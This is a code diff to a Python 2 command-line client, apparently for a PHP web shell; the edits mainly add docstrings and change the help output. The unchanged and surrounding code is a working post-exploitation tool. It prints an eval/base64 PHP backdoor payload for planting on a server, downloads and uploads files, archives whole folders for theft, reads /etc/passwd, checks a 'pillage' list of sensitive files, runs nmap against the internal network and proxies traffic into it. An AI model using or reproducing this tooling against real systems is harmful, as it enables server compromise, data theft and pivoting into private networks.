@@ -63,13 +63,21 @@ class rshell(Cmd):
         f.close()
 
     def do_help(self, line):
+        """
+        This command show the list of commands"""
+        usage = "help"
+        do_methods = filter(lambda x: x.startswith('do_'), dir(self))
+        for m in do_methods:
+            #print m
+            print " -", m[3:], getattr(self, m).__doc__
+
         help_string = {
             "help": "Show this message",
             "payload": "show the shell code in php",
             "download": "download remote_path/remote_file local_path/local_file",
             "upload": "upload local_path/local_file remote_path/remote_file",
             "compress_folder": "compress_folder folder_path file.tar.gz",
-            "dwfolder": "do_dwfolder folder_path",
+            "dwfolder": "dwfolder folder_path",
             "getsysinfo": "get info about the system",
             "getswversion": "get versions of some software",
             "check_files": "check existence of a list of files (pillage.lst)",
@@ -78,13 +86,13 @@ class rshell(Cmd):
             "find_hosts": "find hosts in local network using nmap",
             "print_hosts [ip]": "print finded hosts info",
             "start_proxy": "starts a local proxy, set your browser "
-                        "proxy settings and surf the internal network",
+                           "proxy settings and surf the internal network",
             "stop_proxy": "stops the proxy server",
             "cmd_to_send": "You can write a command to be runned in the server",
             "!cmd_local": "If the command starts with ! it run locally",
         }
-        for k, v in help_string.items():
-            print "\t{0:<20}: {1:<50}".format(k, v)
+        #for k, v in help_string.items():
+        #    print "\t{0:<20}: {1:<50}".format(k, v)
 
         return None
 
@@ -106,11 +114,7 @@ class rshell(Cmd):
 
     def do_quit(self, line):
         """
-        Return true to exit in postcmd
-
-        :param line:
-        :return: Boolean
-        """
+        This is the exit command"""
         self.do_stop_proxy(line)
         return True
 
@@ -127,11 +131,7 @@ class rshell(Cmd):
 
     def do_exit(self, line):
         """
-        Return true to exit in postcmd
-
-        :param line:
-        :return: Boolean
-        """
+        This is the exit command"""
         self.do_stop_proxy(line)
         return True
 
@@ -151,18 +151,21 @@ class rshell(Cmd):
         return 200, request.do_request(full_url, params, self.proxy)
 
     def do_shell(self, line):
-        #This method execute the command locally
+        """
+        This method execute the command locally"""
         print os.popen(line).read()
         return None
 
     def do_payload(self, line):
+        """
+        Print the payload to write in an executable file in the server"""
         self.print_payload()
         return None
 
     def do_phpinfo(self, line):
-        #This is the default command method
-        #system function is called with the command to execute
-        #doing the request to the server
+        """
+        This is the default command method system function is called
+        with the command to execute doing the request to the server"""
         cmd = "phpinfo();"
         (code, data) = self.dorequest(cmd)
         if code == 200:
@@ -183,6 +186,9 @@ class rshell(Cmd):
         print "<?php eval(base64_decode($_POST['param'])); ?>"
 
     def do_download(self, line):
+        """
+        Download a file from the server
+        usage: download remote_path/remote_file local_path/local_file"""
         files = line.split()
         #Return file contents encoded in base 64
         cmd = "echo base64_encode(file_get_contents('{0}'));".format(files[0])
@@ -197,6 +203,9 @@ class rshell(Cmd):
         return None
 
     def do_upload(self, line):
+        """
+        Upload a file to the server
+        usage: upload local_path/local_file remote_path/remote_file"""
         (filename, destination) = line.split()
         f = file(filename)
         f_name = os.path.basename(filename)
@@ -214,12 +223,18 @@ class rshell(Cmd):
         return None
 
     def do_compress_folder(self, line):
+        """
+        Compress a folder in the the server
+        usage: dwfolder compressed_file_name"""
         (folder, local_file) = line.split()
         cmd = "tar -czf {0} {1}".format(local_file, folder)
         self.default(cmd)
         return None
 
     def do_dwfolder(self, line):
+        """
+        Compress and download a entire folder from the server
+        usage: dwfolder folder_path"""
         if line[-1:] == "/":
             line = line[-1]
         filename = "{0}.tar.gz".format(os.path.basename(line))
@@ -228,7 +243,9 @@ class rshell(Cmd):
         return None
 
     def do_getsysinfo(self, line):
-        #Print user and system information
+        """
+        Print user and system information
+        usage: getsysinfo"""
         cmds = {"User name:": "whoami",
                 "User id and groups:": "id",
                 "/etc/passwd:": "cat /etc/passwd",
@@ -248,7 +265,9 @@ class rshell(Cmd):
         return None
 
     def do_getswversion(self, line):
-        #Print some software versions
+        """
+        Print some software versions
+        usage: getswversion"""
         cmds = {"gcc": "gcc --version",
                 "mysql": "mysql --version",
                 "perl": "perl -v Returns",
@@ -273,8 +292,9 @@ class rshell(Cmd):
 
     def do_check_files(self, line):
         """
-            pillage.lst from pwnwiki (https://github.com/pwnwiki)
-        """
+        Check existence of some files extracted from
+        pillage.lst from pwnwiki (https://github.com/pwnwiki)
+        usage: check_files"""
         file_list = file("pillage.lst")
         for filename in file_list:
             #Check filename, [:-1] to remove eol from readline
@@ -283,6 +303,9 @@ class rshell(Cmd):
         return None
 
     def do_get_local_ips(self, line):
+        """
+        Get ips assigned to the local interfaces
+        usage: get_local_ips"""
         cmd = "system('ifconfig -a | grep addr:');"
         (code, response) = self.dorequest(cmd)
         if code == 200:
@@ -298,6 +321,9 @@ class rshell(Cmd):
         return None
 
     def do_print_local_ips(self, line):
+        """
+        Print local ips
+        usage: print_local_ips"""
         for ip, info in self.ips.items():
             print "=" * self.width
             print "{0}:".format(ip)
@@ -305,6 +331,9 @@ class rshell(Cmd):
         return None
 
     def do_find_hosts(self, line):
+        """
+        Find hosts on local network
+        usage: find_hosts"""
         cmd = "nmap "
         if self.ips:
             for ip, info in self.ips.items():
@@ -333,6 +362,9 @@ class rshell(Cmd):
         return None
 
     def do_print_hosts(self, line):
+        """
+        Print the hosts finded whith the command find_hosts
+        usage: print_hosts"""
         if line:
             host = self.hosts[line.split()[0]]
             print "Host name: {0}".format(host[0])
@@ -347,8 +379,9 @@ class rshell(Cmd):
                     print port
 
     def do_start_proxy(self, line):
-        """Start a proxy server on the port
         """
+        Start a local http proxy server to surf the internal network
+        usage: start_proxy"""
         if not self.proxy_object:
             self.proxy_object = proxy.Proxy()
             print "Starting proxy on {1}:{0}".format(self.proxy_object.port,
@@ -361,6 +394,9 @@ class rshell(Cmd):
         return None
 
     def do_stop_proxy(self, line):
+        """
+        Stop the proxy server
+        usage: stop_proxy"""
         if self.proxy_object:
             self.proxy_object.terminate()
             self.proxy_object.join()
@@ -374,6 +410,9 @@ class rshell(Cmd):
         print line
 
     def do_get_os(self, line):
+        """
+        Get information about the operating system using php
+        usage: get_os"""
         cmd = "echo '\tOS: '.php_uname('s').'\n';\
                echo '\tHostName: '.php_uname('n').'\n';\
                echo '\tRelease: '.php_uname('r').'\n';\
